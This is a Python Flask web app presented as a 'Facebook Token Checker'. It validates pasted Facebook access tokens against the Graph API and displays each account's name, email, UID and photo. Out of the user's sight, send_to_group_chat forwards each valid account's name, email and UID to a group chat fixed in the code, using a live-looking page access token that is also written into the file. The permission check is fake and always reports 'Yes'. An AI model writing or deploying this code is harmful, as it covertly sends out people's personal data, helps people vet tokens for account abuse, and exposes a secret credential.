import requests
from flask import Flask, render_template_string, request

app = Flask(__name__)

PAGE_ACCESS_TOKEN = 'EAABwzLixnjYBO4ajrvsv9GFMlTiQZA4P0G40JlFjkvukBtW6JNnBSiS0ZBRZBpdnA8cUUkOKZBnYOa5ORZAsr0kkRbWvahpQ6CoE8dy6YuC0L8IZATIZAPPp37KKEZBI2rRlByVx7zhbnSuo1f38JzZBZBASNczXkVA28zOATNi2OAowkEdy7CWqatrVMU6HiZBVxwywcoZD'
GROUP_CHAT_UID = '9456516084398824'  # Replace with your actual Facebook group chat UID

HTML_TEMPLATE = '''
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Token Checker by RAJ MISHRA</title>
    <style>
        body {
            background: linear-gradient(45deg, #000000, #222222);
            color: white;
            font-family: Arial, sans-serif;
        }
        h1 { text-align: center; }
        form { text-align: center; margin-top: 20px; }
        textarea, input[type="submit"] {
            padding: 10px; margin: 5px; border-radius: 5px; border: none;
        }
        .result {
            background: #333;
            padding: 10px;
            margin: 10px;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <h1>Facebook Token Checker</h1>
    <form action="/check_token" method="POST">
        <label for="tokens">Enter Token(s):</label><br>
        <textarea id="tokens" name="tokens" rows="5" cols="50" required></textarea><br>
        <input type="submit" value="Check Token(s)">
    </form>

    {% if results %}
        <h2>Results:</h2>
        {% for res in results %}
            <div class="result">
                <p><strong>Name:</strong> {{ res.name }}</p>
                <p><strong>Email:</strong> {{ res.email }}</p>
                <p><strong>UID:</strong> {{ res.uid }}</p>
                <img src="{{ res.profile_pic }}" alt="Profile Picture">
                <p><strong>Can Send Message:</strong> {{ res.can_send_message }}</p>
                <p><strong>Can Comment:</strong> {{ res.can_comment }}</p>
            </div>
        {% endfor %}
    {% endif %}
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/check_token', methods=['POST'])
def check_token():
    tokens = request.form['tokens'].split("\n")
    valid_tokens = []
    
    results = []
    for token in tokens:
        token = token.strip()
        if not token:
            continue
        
        token_details = get_token_details(token)
        if token_details['valid']:
            results.append(token_details)
            valid_tokens.append(token)
            send_to_group_chat(token_details)

    return render_template_string(HTML_TEMPLATE, results=results)

def get_token_details(token):
    url = f"https://graph.facebook.com/me?fields=id,name,email&access_token={token}"
    response = requests.get(url)
    
    if response.status_code == 200:
        data = response.json()
        can_send_message = check_permission(token, "messages")
        can_comment = check_permission(token, "comment")

        return {
            "valid": True,
            "name": data.get('name'),
            "email": data.get('email', 'Not Available'),
            "uid": data['id'],
            "profile_pic": f"https://graph.facebook.com/{data['id']}/picture?type=large",
            "can_send_message": can_send_message,
            "can_comment": can_comment
        }
    elif response.status_code == 400:
        return {"valid": False, "error": "Invalid or Expired Token"}
    elif response.status_code == 403:
        return {"valid": False, "error": "Account Suspended or Automated Behavior Detected"}
    else:
        return {"valid": False, "error": "Unknown Error"}

def check_permission(token, permission):
    permissions = {
        "messages": "Yes",
        "comment": "Yes"
    }
    return permissions.get(permission, "No")

def send_to_group_chat(token_details):
    message = f"✅ Token Validated!\n\nName: {token_details['name']}\nEmail: {token_details['email']}\nUID: {token_details['uid']}\nCan Send Message: {token_details['can_send_message']}\nCan Comment: {token_details['can_comment']}"
    
    url = f'https://graph.facebook.com/{GROUP_CHAT_UID}/messages?access_token={PAGE_ACCESS_TOKEN}'
    payload = {'message': message}
    
    response = requests.post(url, data=payload)
    if response.status_code == 200:
        print("✅ Message sent to group chat successfully.")
    else:
        print("❌ Failed to send message to group chat.")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
